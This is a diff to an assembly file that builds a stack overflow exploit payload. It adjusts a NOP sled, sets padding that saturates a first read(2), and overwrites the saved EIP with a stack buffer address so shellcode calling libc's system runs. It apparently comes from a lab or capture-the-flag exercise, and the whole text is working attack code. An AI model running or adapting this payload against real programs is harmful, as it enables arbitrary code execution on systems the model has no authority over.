@@ -13,10 +13,15 @@ shellcode_start:
         mov eax, libc_system
         call eax
 
+shellcode_nops:
+        .rept 20 - (shellcode_nops - shellcode_start)
+        nop
+        .endr
+
 shellcode_padding:
         // fill with junk to saturate first read(2)
         .rept 4095 - (shellcode_padding - shellcode_start)
-        .byte 0x42
+        .byte 'Z'
         .endr
 
         // don't forget '\n' otherwise the program will crash (segfault)
@@ -24,14 +29,16 @@ shellcode_padding:
 
 // second read, overwrite saved eip
 shellcode_end:
-        .rept 9
-        .byte 0x41
+        // padding before address
+        .rept 14
+        .byte 'A'
         .endr
 
         .int stack_buffer
 
-        .rept 7
-        .byte 0x42
+        // padding after address
+        .rept 1
+        .byte 'B'
         .endr
 
         // don't forget '\n' otherwise the program will crash (segfault)
